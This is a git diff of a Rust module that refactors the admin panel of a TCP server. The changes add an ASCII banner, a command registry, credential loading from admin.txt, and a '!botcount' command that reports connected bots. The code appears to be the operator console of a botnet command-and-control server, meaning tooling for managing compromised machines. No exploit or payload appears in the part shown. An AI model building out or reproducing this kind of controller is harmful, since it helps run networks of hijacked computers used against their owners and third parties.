@@ -1,10 +1,45 @@
 // src/admin/mod.rs
 
-
 use std::net::TcpStream;
 use std::collections::HashMap;
 use std::fs::File;
 use std::io::{ BufRead, BufReader, Read, Write};
+use lazy_static::lazy_static;
+use std::sync::{Arc, Mutex};
+
+use crate::common::BOT_COUNT;
+
+
+static MOTD: &str = "
+     _______           _______ _________ _        _______ _________
+    (  ____ )|\\     /|(  ____ \\\\__   __/( (    /|(  ____ \\\\__   __/
+    | (    )|| )   ( || (    \\/   ) (   |  \\  ( || (    \\/   ) (   
+    | (____)|| |   | || (_____    | |   |   \\ | || (__       | |   
+    |     __)| |   | |(_____  )   | |   | (\\ \\) ||  __)      | |   
+    | (\\ (   | |   | |      ) |   | |   | | \\   || (         | |   
+    | ) \\ \\__| (___) |/\\____) |   | |   | )  \\  || (____/\\   | |   
+    |/   \\__/(_______)\\_______)   )_(   |/    )_)(_______/   )_( \n\n\n";
+
+
+trait CommandHandler {
+    fn handle(&self, stream: &mut TcpStream, args: &[String]);
+}
+lazy_static! {
+    static ref COMMAND_REGISTRY: Arc<Mutex<HashMap<String, Box<dyn CommandHandler + Send + 'static>>>> = {
+        let mut m = HashMap::new();
+        m.insert("!botcount".to_string(), Box::new(BotCountCommand) as Box<dyn CommandHandler + Send>);
+        Arc::new(Mutex::new(m))
+    };
+}
+
+struct BotCountCommand;
+impl CommandHandler for BotCountCommand {
+    fn handle(&self, stream: &mut TcpStream, _args: &[String]) {
+        let count = BOT_COUNT.lock().unwrap();
+        let response = format!("Connected bots: {}\n", count);
+        stream.write_all(response.as_bytes()).expect("Failed to write to stream");
+    }
+}
 
 pub fn load_credentials() -> HashMap<String, String> {
     let file = File::open("admin.txt").expect("Unable to open file");
@@ -49,11 +84,9 @@ pub fn handle_connection(mut stream: TcpStream, credentials: HashMap<String, Str
     }
 }
 
-
-
-pub fn handle_authenticated_session(mut stream: TcpStream, username: &str) {
+fn handle_authenticated_session(mut stream: TcpStream, username: &str) {
     println!("{} has joined!", username);
-    stream.write_all(get_motd().as_bytes()).unwrap();
+    stream.write_all(MOTD.as_bytes()).unwrap();
 
     let mut buffer = [0; 1024];
     loop {
@@ -70,20 +103,23 @@ pub fn handle_authenticated_session(mut stream: TcpStream, username: &str) {
             break;
         }
         // handle commands
-        stream.write_all(&buffer[0..size]).unwrap();
+        let input = match std::str::from_utf8(&buffer[..size]) {
+            Ok(v) => v,
+            Err(e) => {
+                eprintln!("Invalid UTF-8 sequence: {}", e);
+                continue;
+            },
+        };
+        let args: Vec<String> = input.split_whitespace().map(String::from).collect();
+        if let Some(command) = args.first() {
+            let command_registry = COMMAND_REGISTRY.lock().unwrap();
+            if let Some(handler) = command_registry.get(command) {
+                handler.handle(&mut stream, &args[1..]);
+            } else {
+                // Handle unknown command
+                stream.write_all(b"Unknown command\n").expect("Failed to write to stream");
+            }
+        }
     }
 }
 
-
-pub fn get_motd() -> &'static str{
-    let motd = "
-     _______           _______ _________ _        _______ _________
-    (  ____ )|\\     /|(  ____ \\\\__   __/( (    /|(  ____ \\\\__   __/
-    | (    )|| )   ( || (    \\/   ) (   |  \\  ( || (    \\/   ) (   
-    | (____)|| |   | || (_____    | |   |   \\ | || (__       | |   
-    |     __)| |   | |(_____  )   | |   | (\\ \\) ||  __)      | |   
-    | (\\ (   | |   | |      ) |   | |   | | \\   || (         | |   
-    | ) \\ \\__| (___) |/\\____) |   | |   | )  \\  || (____/\\   | |   
-    |/   \\__/(_______)\\_______)   )_(   |/    )_)(_______/   )_( \n\n\n";
-    return motd;
-}
